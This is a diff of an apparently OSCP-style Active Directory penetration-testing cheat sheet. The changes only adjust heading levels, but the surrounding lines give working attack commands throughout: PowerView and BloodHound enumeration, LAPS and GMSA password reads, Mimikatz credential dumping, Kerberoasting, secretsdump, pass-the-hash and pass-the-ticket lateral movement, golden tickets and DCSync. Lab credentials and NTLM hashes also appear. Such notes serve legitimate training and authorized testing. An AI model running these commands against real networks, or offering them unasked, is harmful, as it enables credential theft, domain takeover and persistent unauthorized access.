@@ -42,7 +42,7 @@ Active Directory User Enumeration
 
 Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>
 ```
-###### Nested Groups
+#### Nested Groups
 ```
 powershell -ep bypass
 Import-Module .\PowerView.ps1
@@ -54,7 +54,7 @@ Get-DomainGroup -MemberIdentity 'michelle' | select samaccountname,memberof,memb
 Get-DomainGroup -MemberIdentity 'michelle' | select samaccountname
 Get-DomainGroup -MemberIdentity 'michelle' 
 ```
-###### Computer Info
+#### Computer Info
 ```
 Get-NetComputer
 Get-NetComputer | select operatingsystem,dnshostname
@@ -100,7 +100,7 @@ usnchanged                    : 178663
 ridsetreferences              : CN=RID Set,CN=DC1,OU=Domain Controllers,DC=corp,DC=com
 dnshostname                   : DC1.corp.com
 ```
-###### Logged On Users
+#### Logged On Users
 ```
 Find possible local administrative access on computers under the current user context:
 PowerView.ps1 : Find-LocalAdminAccess
@@ -111,7 +111,7 @@ Enumerate active sessions:
 Enumerate IP address based on computername such as client74:
 Get-NetSession -ComputerName client74
 ```
-###### Object Permissions
+#### Object Permissions
 GenericAll: Full permissions on object  
 GenericWrite: Edit certain attributes on the object  
 WriteOwner: Change ownership of the object  
@@ -137,7 +137,7 @@ When Stephanie has GenericAll permissions on "Management Department" group, you 
 ```
 net group "Management Department" stephanie /add /domain
 ```
-###### Enumerate Domain Shares
+#### Enumerate Domain Shares
 ```
 powershell -ep bypass
 Import-module .\PowerView.ps1
@@ -145,7 +145,7 @@ Find-DomainShare
 ls \\dc1.corp.com\"Important Files"\
 type \\dc1.corp.com\"Important Files"\proof.txt
 ```
-###### BloodHound
+#### BloodHound
 Initiation
 ```
 Compromised machine: Import-Module .\SharpHound.ps1
@@ -163,12 +163,12 @@ neo4j 4.4.26
 bloodhound 4.3.1
 SharpHound.ps1 1.1.1
 ```
-##### Bloodhound-python
+#### Bloodhound-python
 This will extract all json files if you have credential but no shell
 ```
 bloodhound-python --dns-tcp -ns $IP -d hutch.offsec -u 'fmcsorley' -p 'CrabSharkJellyfish192' -c all
 ```
-###### Read GMSAP Password
+#### Read GMSAP Password
 ```
 Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}
 Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,Created,LastLogonDate,PasswordLastSet,msDS-ManagedPasswordInterval,PrincipalsAllowedToDelegateToAccount,PrincipalsAllowedToRetrieveManagedPassword,ServicePrincipalNames
@@ -191,14 +191,14 @@ Calculating hashes for Current Value
 [*]       aes256_cts_hmac_sha1 : D3C18DAF21128CAFEAECE5BFF6599A0A4DFB2E9BE22F6CFE13677688B0A34988
 [*]       des_cbc_md5          : 0804169DCECB6102
 ```
-##### ReadLaps Password
+#### ReadLaps Password
 >LAPS allows you to manage the local Administrator password (which is randomized, unique, and changed regularly) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorized users using ACLs. 
 ```
 lapsdumper -u fmcsorley -p CrabSharkJellyfish192 -d hutch.offsec -l 192.168.153.122
 lapsdumper -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc host
 ldapsearch -v -c -D fmcsorley@hutch.offsec -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -H ldap://192.168.153.122 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
 ```
-##### Abusing GPO (Group Policy Object)
+#### Abusing GPO (Group Policy Object)
 Check:
 ```
 Import-Module .\PowerView.ps1
@@ -211,7 +211,7 @@ Abuse:
 gpupdate /force
 ```
 ### Authentication
-###### Minikatz(require local admin)
+#### Minikatz(require local admin)
 Load DemoEXE and run it locally.  
 ```
 $PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')  
@@ -232,7 +232,7 @@ Cached Credentials:
 TGT and TGS:
 1. sekurlsa::tickets
 ```
-###### Kerberoasting
+#### Kerberoasting
 >The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts. Thus, part of these TGS tickets are encrypted with keys derived from user passwords. As a consequence, their credentials could be cracked offline. You can know that a user account is being used as a service because the property "ServicePrincipalName" is not null.
 
 >Therefore, to perform Kerberoasting, only a domain account that can request for TGSs is necessary, which is anyone since no special privileges are required.
@@ -255,7 +255,7 @@ Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASC
 ### Lateral Movement
 /ticket - optional - filename for output the ticket - default is: ticket.kirbi.  
 /ptt - no output in file, just inject the golden ticket in current session.
-###### Crackmapexec
+#### Crackmapexec
 ```
 Failed logins result in a [-]
 Successful logins result in a [+] Domain\Username:Password
@@ -282,13 +282,13 @@ cme winrm ip -u celia.almeda -H ntlm_hash
 cme winrm ip -u celia.almeda -p password
 ```
 
-###### Dump the local password hash and domain cached hash
+#### Dump the local password hash and domain cached hash
 ```
 impacket-secretsdump -sam SAM(local SAM file) -system SYSTEM(local SYSTEM file) local
 impacket-secretsdump celia.almeda:7k8XHk3dMtmpnC7@10.10.96.142 -sam SAM -system SYSTEM -outputfile /home/kali/Desktop/admin_hash.txt
 impacket-secretsdump celia.almeda@10.10.96.142 -sam SAM -system SYSTEM -outputfile /home/kali/Desktop/admin_hash.txt -hashes lm:nt
 ```
-###### Other Tools
+#### Other Tools
 ```
 pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd (winexesvc service)
 
@@ -298,7 +298,7 @@ impacket-psexec domain/Administrator:password@192.168.1.140 (135/445 port requir
 PsExec.exe \\192.168.1.104 -u administrator -p Ignite@123 cmd (135/445 port required)
 ```
 
-###### Converted NTLM hash into a Kerberos TGT and leveraged that to gain remote code execution
+#### Converted NTLM hash into a Kerberos TGT and leveraged that to gain remote code execution
 https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
 ```
 sekurlsa::logonpasswords
@@ -307,7 +307,7 @@ net use \\dc01(logon server)
 klist
 .\PsExec.exe \\dc01 or \\DC01/Allison cmd.exe
 ```
-###### Pass the Ticket
+#### Pass the Ticket
 ```
 whoami /user
 kerberos::purge
@@ -319,7 +319,7 @@ Remote Code Execution: Invoke-WmiMethod win32_process -ComputerName $Computer -C
 ```
 
 ### Persistence
-###### Golden Tickets(only if we can get password hash of a domain user account called krbtgt)
+#### Golden Tickets(only if we can get password hash of a domain user account called krbtgt)
 ```
 privilege::debug
 lsadump::lsa /patch(get password hash)
@@ -328,7 +328,7 @@ kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-278752
 misc::cmd(launch a new command prompt)
 psexec.exe \\dc01 cmd.exe
 ```
-###### Domain Controller SynchronizationZ
+#### Domain Controller SynchronizationZ
 Require domain admin account
 ```
 lsadump::dcsync /user:Administrator
